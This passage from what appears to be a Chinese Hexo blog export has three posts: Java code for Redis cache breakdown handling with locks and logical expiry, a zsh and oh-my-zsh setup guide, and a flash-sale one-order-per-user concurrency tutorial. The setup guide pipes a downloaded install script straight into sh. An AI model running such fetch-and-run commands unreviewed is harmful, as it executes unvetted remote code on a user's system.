模拟重建的延时</span></span><br><span class="line">        Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不存在，将空值写入缓存，防止缓存穿透</span></span><br><span class="line">        <span class="keyword">if</span> (shop == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 设置空值缓存 过期时间为2分钟</span></span><br><span class="line">            stringRedisTemplate.opsForValue().set(key, <span class="string">&quot;&quot;</span>, CACHE_NULL_TTL, TimeUnit.MINUTES);</span><br><span class="line">            <span class="comment">// 返回错误信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将查询到的数据写入缓存 设置过期时间</span></span><br><span class="line">        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(shop), CACHE_SHOP_TTL, TimeUnit.MINUTES);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 释放互斥锁</span></span><br><span class="line">        unlock(LOCK_SHOP_KEY + id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 返回数据</span></span><br><span class="line">    <span class="keyword">return</span> shop;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用逻辑过期来解决：</p>
<p><img src="/images/image17.png" alt="alt text"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Shop <span class="title function_">queryWithLogicalExpire</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> CACHE_SHOP_KEY + id;</span><br><span class="line">    <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">shopJson</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 如果缓存中不存在数据，直接返回null</span></span><br><span class="line">    <span class="keyword">if</span> (StrUtil.isBlank(shopJson)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 命中，需要先把json反序列化为对象</span></span><br><span class="line">    <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> JSONUtil.toBean(shopJson, RedisData.class);</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">data</span> <span class="operator">=</span> (JSONObject) redisData.getData();</span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> JSONUtil.toBean(data, Shop.class);</span><br><span class="line">    <span class="type">LocalDateTime</span> <span class="variable">expireTime</span> <span class="operator">=</span> redisData.getExpireTime();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断是否过期</span></span><br><span class="line">    <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 4.1 未过期，直接返回信息</span></span><br><span class="line">        <span class="keyword">return</span> shop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 已过期，需要缓存重建</span></span><br><span class="line">    <span class="comment">// 5. 缓存重建</span></span><br><span class="line">    <span class="comment">// 5.1 获取互斥锁</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lockKey</span> <span class="operator">=</span> LOCK_SHOP_KEY + id;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> tryLock(lockKey);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 判断是否获取成功</span></span><br><span class="line">    <span class="keyword">if</span> (isLock) &#123;</span><br><span class="line">        <span class="comment">// 再次检查是否过期</span></span><br><span class="line">        <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">            <span class="comment">// 未过期，释放锁，直接返回</span></span><br><span class="line">            unlock(lockKey);</span><br><span class="line">            <span class="keyword">return</span> shop;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 过期</span></span><br><span class="line">        <span class="comment">// 5.3 获取锁成功，开启独立线程，实现缓存重建(利用线程池)</span></span><br><span class="line">        CACHE_REBUILD_EXECUTOR.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 缓存重建</span></span><br><span class="line">                <span class="built_in">this</span>.saveShop2Redis(id, CACHE_SHOP_TTL);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 释放锁</span></span><br><span class="line">                unlock(lockKey);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.4 未成功，返回商铺信息（过期的数据）</span></span><br><span class="line">    <span class="keyword">return</span> shop;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">    <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(key, <span class="string">&quot;1&quot;</span>, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">    <span class="keyword">return</span> BooleanUtil.isTrue(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">    stringRedisTemplate.delete(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveShop2Redis</span><span class="params">(Long id, Long expireSeconds)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">    <span class="comment">// 1. 查询店铺信息</span></span><br><span class="line">    <span class="type">Shop</span> <span class="variable">shop</span> <span class="operator">=</span> getById(id);</span><br><span class="line">    Thread.sleep(<span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 封装逻辑过期时间</span></span><br><span class="line">    <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RedisData</span>();</span><br><span class="line">    redisData.setData(shop);</span><br><span class="line">    redisData.setExpireTime(LocalDateTime.now().plusSeconds(expireSeconds));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 写入redis</span></span><br><span class="line">    stringRedisTemplate.opsForValue().set(CACHE_SHOP_KEY + id, JSONUtil.toJsonStr(redisData));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="封装缓存工具类"><a href="#封装缓存工具类" class="headerlink" title="封装缓存工具类"></a>封装缓存工具类</h3><p>代码如下：</p>
<p>主要通过<strong>泛型</strong>和<strong>函数式编程</strong>来实现缓存工具的封装。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CacheClient</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CacheClient</span><span class="params">(StringRedisTemplate stringRedisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stringRedisTemplate = stringRedisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(String key, Object value, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(value), time, unit);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setWithLogicalExpire</span><span class="params">(String key, Object value, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="comment">// 逻辑过期</span></span><br><span class="line">        <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RedisData</span>();</span><br><span class="line">        redisData.setData(value);</span><br><span class="line">        redisData.setExpireTime(LocalDateTime.now().plusSeconds(unit.toSeconds(time)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存到redis</span></span><br><span class="line">        stringRedisTemplate.opsForValue().set(key, JSONUtil.toJsonStr(redisData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; R <span class="title function_">queryWithPassThrough</span><span class="params">(String keyPrefix, ID id, Class&lt;R&gt; type, Function&lt;ID, R&gt; dbFallback</span></span><br><span class="line"><span class="params">            , Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id;</span><br><span class="line">        <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 如果缓存中有数据，直接返回</span></span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isNotBlank(json)) &#123; <span class="comment">// 是真实商铺数据才会进入if返回数据</span></span><br><span class="line">            <span class="keyword">return</span> JSONUtil.toBean(json, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断命中的是否为空值</span></span><br><span class="line">        <span class="keyword">if</span> (json != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 返回错误信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 如果缓存中没有数据，从数据库中查询</span></span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> dbFallback.apply(id);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不存在，将空值写入缓存，防止缓存穿透</span></span><br><span class="line">        <span class="keyword">if</span> (r == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 设置空值缓存 过期时间为2分钟</span></span><br><span class="line">            stringRedisTemplate.opsForValue().set(key, <span class="string">&quot;&quot;</span>, CACHE_NULL_TTL, TimeUnit.MINUTES);</span><br><span class="line">            <span class="comment">// 返回错误信息</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 将查询到的数据写入缓存 设置过期时间</span></span><br><span class="line">        <span class="built_in">this</span>.set(key, r, time, unit);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 返回数据</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ExecutorService</span> <span class="variable">CACHE_REBUILD_EXECUTOR</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> &lt;R, ID&gt; R <span class="title function_">queryWithLogicalExpire</span><span class="params">(String keyPrefix, ID id, Class&lt;R&gt; type, Function&lt;ID, R&gt; dbFallback, Long time, TimeUnit unit)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> keyPrefix + id;</span><br><span class="line">        <span class="comment">// 1. 从redis中查询商铺缓存</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 如果缓存中不存在数据，直接返回null</span></span><br><span class="line">        <span class="keyword">if</span> (StrUtil.isBlank(json)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 命中，需要先把json反序列化为对象</span></span><br><span class="line">        <span class="type">RedisData</span> <span class="variable">redisData</span> <span class="operator">=</span> JSONUtil.toBean(json, RedisData.class);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">data</span> <span class="operator">=</span> (JSONObject) redisData.getData();</span><br><span class="line">        <span class="type">R</span> <span class="variable">r</span> <span class="operator">=</span> JSONUtil.toBean(data, type);</span><br><span class="line">        <span class="type">LocalDateTime</span> <span class="variable">expireTime</span> <span class="operator">=</span> redisData.getExpireTime();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 判断是否过期</span></span><br><span class="line">        <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">            <span class="comment">// 4.1 未过期，直接返回信息</span></span><br><span class="line">            <span class="keyword">return</span> r;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.2 已过期，需要缓存重建</span></span><br><span class="line">        <span class="comment">// 5. 缓存重建</span></span><br><span class="line">        <span class="comment">// 5.1 获取互斥锁</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">lockKey</span> <span class="operator">=</span> LOCK_SHOP_KEY + id;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> tryLock(lockKey);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.2 判断是否获取成功</span></span><br><span class="line">        <span class="keyword">if</span> (isLock) &#123;</span><br><span class="line">            <span class="comment">// 再次检查是否过期</span></span><br><span class="line">            <span class="keyword">if</span> (expireTime.isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">                <span class="comment">// 未过期，释放锁，直接返回</span></span><br><span class="line">                unlock(lockKey);</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 过期</span></span><br><span class="line">            <span class="comment">// 5.3 获取锁成功，开启独立线程，实现缓存重建(利用线程池)</span></span><br><span class="line">            CACHE_REBUILD_EXECUTOR.submit(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 查询数据库</span></span><br><span class="line">                    <span class="type">R</span> <span class="variable">r1</span> <span class="operator">=</span> dbFallback.apply(id);</span><br><span class="line">                    <span class="comment">// 写入Redis</span></span><br><span class="line">                    <span class="built_in">this</span>.setWithLogicalExpire(key, r1, time, unit);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="comment">// 释放锁</span></span><br><span class="line">                    unlock(lockKey);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.4 未成功，返回商铺信息（过期的数据）</span></span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().setIfAbsent(key, <span class="string">&quot;1&quot;</span>, <span class="number">10</span>, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">return</span> BooleanUtil.isTrue(flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        stringRedisTemplate.delete(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<!-- redis 简介视频 -->
<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113526672857610&bvid=BV18jBiYpEDJ&cid=26907247203&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"></iframe>

<style>
    iframe {
      width: 100%;
      height: 500px;
    }
  </style>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下使用zsh以及oh-my-zsh</title>
    <url>/2025/03/17/linux%E4%B8%8B%E4%BD%BF%E7%94%A8zsh%E4%BB%A5%E5%8F%8Aoh-my-zsh/</url>
    <content><![CDATA[<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure>

<h2 id="安装zsh"><a href="#安装zsh" class="headerlink" title="安装zsh"></a>安装zsh</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install zsh</span><br></pre></td></tr></table></figure>

<h2 id="安装oh-my-zsh"><a href="#安装oh-my-zsh" class="headerlink" title="安装oh-my-zsh"></a>安装oh-my-zsh</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br></pre></td></tr></table></figure>

<h2 id="切换shell"><a href="#切换shell" class="headerlink" title="切换shell"></a>切换shell</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>

<p>注意，需要重启终端才能生效。</p>
<h2 id="不重启保持使用zsh"><a href="#不重启保持使用zsh" class="headerlink" title="不重启保持使用zsh"></a>不重启保持使用zsh</h2><p>打开preferences，找到profiles，选择command，将command改为<code>/bin/zsh</code>，然后重启终端。</p>
<h2 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>找到<code>ZSH_THEME=&quot;robbyrussell&quot;</code>，可以修改主题，例如<code>ZSH_THEME=&quot;random&quot;</code>。</p>
<p>要运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source ~/.zshrc</span><br></pre></td></tr></table></figure>

<p>才能生效。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果windows默认shell是zsh该多好啊…</p>
]]></content>
      <tags>
        <tag>toy</tag>
      </tags>
  </entry>
  <entry>
    <title>一人一单问题</title>
    <url>/2025/03/18/%E4%B8%80%E4%BA%BA%E4%B8%80%E5%8D%95%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="什么是一人一单"><a href="#什么是一人一单" class="headerlink" title="什么是一人一单"></a>什么是一人一单</h2><p>一人一单是指每个用户只能购买一次商品，这种情况通常发生在限购活动中，比如双十一、618等大促销活动。一人一单的原因主要是为了防止用户恶意刷单，导致库存不足。</p>
<h2 id="如何解决一人一单问题"><a href="#如何解决一人一单问题" class="headerlink" title="如何解决一人一单问题"></a>如何解决一人一单问题</h2><p>查询数据库中对应订单记录数量，如果大于0则表示用户已经购买过，不能再次购买。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 查询代金券库存</span></span><br><span class="line">    <span class="type">SeckillVoucher</span> <span class="variable">voucher</span> <span class="operator">=</span> seckillVoucherService.getById(voucherId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 判断秒杀是否开始</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀未开始</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀未开始&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断秒杀是否结束</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀已结束</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀已结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断库存是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getStock() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 一人一单</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.1 查询订单 会有并发问题</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> query().eq(<span class="string">&quot;user_id&quot;</span>, userId).eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).count();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 用户已经购买过</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;用户已经购买过一次!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 扣减库存(CAS)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>) <span class="comment">// set stock = stock - 1</span></span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId) <span class="comment">// where voucher_id = #&#123;voucherId&#125;</span></span><br><span class="line">            .gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// and stock &gt; 0</span></span><br><span class="line"><span class="comment">//                .eq(&quot;stock&quot;, voucher.getStock()) // where stock = #&#123;stock&#125;</span></span><br><span class="line">            .update(); <span class="comment">// 原子性操作 不会存在都为1然后都修改的情况</span></span><br><span class="line">    <span class="keyword">if</span> (!success) &#123;</span><br><span class="line">        <span class="comment">// 扣减库存失败</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 创建订单</span></span><br><span class="line">    <span class="type">VoucherOrder</span> <span class="variable">voucherOrder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VoucherOrder</span>();</span><br><span class="line">    <span class="comment">// 7.1 订单id</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">orderId</span> <span class="operator">=</span> redisIdWorker.nextId(<span class="string">&quot;order&quot;</span>);</span><br><span class="line">    voucherOrder.setId(orderId);</span><br><span class="line">    <span class="comment">// 7.2 用户id</span></span><br><span class="line">    voucherOrder.setUserId(userId);</span><br><span class="line">    <span class="comment">// 7.3 代金券id</span></span><br><span class="line">    voucherOrder.setVoucherId(voucherId);</span><br><span class="line">    save(voucherOrder);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 返回订单id</span></span><br><span class="line">    <span class="keyword">return</span> Result.ok(orderId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用jmeter进行压测，发现存在并发问题，即多个请求同时进入时，会导致用户购买多次。</p>
<p>为什么会出现这种情况呢？因为query()查询订单记录不会有数据库锁进行隔离，会存在并发问题。</p>
<p>当第一次请求进入时，查询订单记录数量为0，此时其他请求也进入，查询订单记录数量也为0，然后多个请求都执行扣减库存操作，导致用户购买多次。</p>
<h2 id="如何解决并发问题"><a href="#如何解决并发问题" class="headerlink" title="如何解决并发问题"></a>如何解决并发问题</h2><p>加锁解决并发问题，保证查询订单记录和扣减库存操作的原子性。</p>
<p>使用悲观锁来处理：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 查询代金券库存</span></span><br><span class="line">    <span class="type">SeckillVoucher</span> <span class="variable">voucher</span> <span class="operator">=</span> seckillVoucherService.getById(voucherId);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 判断秒杀是否开始</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getBeginTime().isAfter(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀未开始</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀未开始&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 判断秒杀是否结束</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getEndTime().isBefore(LocalDateTime.now())) &#123;</span><br><span class="line">        <span class="comment">// 秒杀已结束</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;秒杀已结束&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 判断库存是否足够</span></span><br><span class="line">    <span class="keyword">if</span> (voucher.getStock() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 库存不足</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;库存不足&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 悲观锁 防止刷单购买</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line">    <span class="keyword">synchronized</span> (userId.toString().intern()) &#123;</span><br><span class="line">        <span class="comment">// 获取代理对象(事务)</span></span><br><span class="line">        <span class="type">IVoucherOrderService</span> <span class="variable">proxy</span> <span class="operator">=</span> (IVoucherOrderService) AopContext.currentProxy();</span><br><span class="line">        <span class="comment">// 如果不获取代理对象，会调用this.func导致事务失效</span></span><br><span class="line">        <span class="comment">// 因为spring通过代理模式来实现事务，如果直接调用this.func，那么就不会走代理，导致事务失效</span></span><br><span class="line">        <span class="keyword">return</span> proxy.createVoucherOrder(voucherId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">createVoucherOrder</span><span class="params">(Long voucherId)</span> &#123; <span class="comment">// 注意，不能加方法锁，会导致串行化，性能下降</span></span><br><span class="line">    <span class="comment">// 5. 一人一单</span></span><br><span class="line">    <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser().getId();</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 锁定用户id 使用intern来保证锁的唯一性</span></span><br><span class="line"><span class="comment">//        // intern 如果常量池中有则返回常量池中的对象，如果没有则放入常量池并返回</span></span><br><span class="line"><span class="comment">//        // 但是这里会有问题，因为如果锁释放了，但是事务还没有提交，那么其他线程就可以获取到锁，导致并发问题</span></span><br><span class="line"><span class="comment">//        // 所以sync要放在事务外面 但是不能放在方法上，因为会导致串行化</span></span><br><span class="line"><span class="comment">//        synchronized (userId.toString().intern()) &#123;</span></span><br><span class="line">    <span class="comment">// 5.1 查询订单(非原子操作) 会有并发问题</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> query().eq(<span class="string">&quot;user_id&quot;</span>, userId).eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId).count();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.2 判断是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 用户已经购买过</span></span><br><span class="line">        <span class="keyword">return</span> Result.fail(<span class="string">&quot;用户已经购买过一次!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 扣减库存(CAS)</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> seckillVoucherService.update()</span><br><span class="line">            .setSql(<span class="string">&quot;stock = stock - 1&quot;</span>) <span class="comment">// set stock = stock - 1</span></span><br><span class="line">            .eq(<span class="string">&quot;voucher_id&quot;</span>, voucherId) <span class="comment">// where voucher_id = #&#123;voucherId&#125;</span></span><br><span class="line">            .gt(<span class="string">&quot;stock&quot;</span>, <span class="number">0</span>) <span class="comment">// and stock &gt; 0</span></span><br><span class="line">            <span class="comment">//                .eq(&quot;stock&quot;, voucher.getStock()) // where stock = #&#123;stock&#125;</span></span><br><span class="line">            .update(); <span class="comment">// 原子性操作 不会存在都为1然后都修改的情况</span></span><br><span class="line">    <span class="keyword">if</span> (!success) 